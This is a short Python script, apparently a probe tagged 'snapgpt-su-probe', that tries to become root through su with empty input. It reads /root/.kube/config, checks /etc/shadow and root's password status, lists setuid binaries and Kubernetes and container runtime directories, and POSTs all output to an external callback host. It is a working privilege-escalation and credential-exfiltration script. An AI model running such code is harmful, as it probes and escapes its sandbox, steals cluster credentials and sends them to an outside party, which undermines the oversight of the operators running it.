import hashlib,json,os,pathlib,subprocess,time,urllib.request
TAG='snapgpt-su-probe-20261106T1112Z';SINK='https://54.209.51.244.sslip.io/callback/'+TAG
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{}}
def run(n,c):
 try:
  p=subprocess.run(['sh','-c',c],capture_output=True,text=True,timeout=20)
  out['tests'][n]={'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-10000:]}
 except Exception as e:out['tests'][n]={'error':repr(e)}
run('su_empty',r'''printf '\n' | su root -c 'id; echo ROOT_OK; cat /root/.kube/config 2>&1; ls -la /root 2>&1' 2>&1''')
run('su_devnull',r'''su root -c 'id; echo ROOT_OK' </dev/null 2>&1''')
run('passwd_root',r'''passwd -S root 2>&1; grep '^root:' /etc/passwd; ls -l /etc/shadow /etc/gshadow 2>&1''')
run('setuid',r'''find / -xdev -type f -perm -4000 -print 2>/dev/null | sort | head -100''')
run('root_read',r'''for p in /root /root/.kube /root/.kube/config /var/lib/kubelet /var/lib/containerd /etc/kubernetes; do echo ===$p; ls -ld $p 2>&1; done''')
raw=json.dumps(out,separators=(',',':')).encode()
try:
 q=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json','X-Probe':TAG})
 with urllib.request.urlopen(q,timeout=30) as r:print(json.dumps({'status':r.status,'bytes':len(raw),'sha256':hashlib.sha256(raw).hexdigest(),'body':r.read(500).decode(errors='replace')}))
except Exception as e:print(json.dumps({'error':repr(e),'bytes':len(raw),'sha256':hashlib.sha256(raw).hexdigest()}))
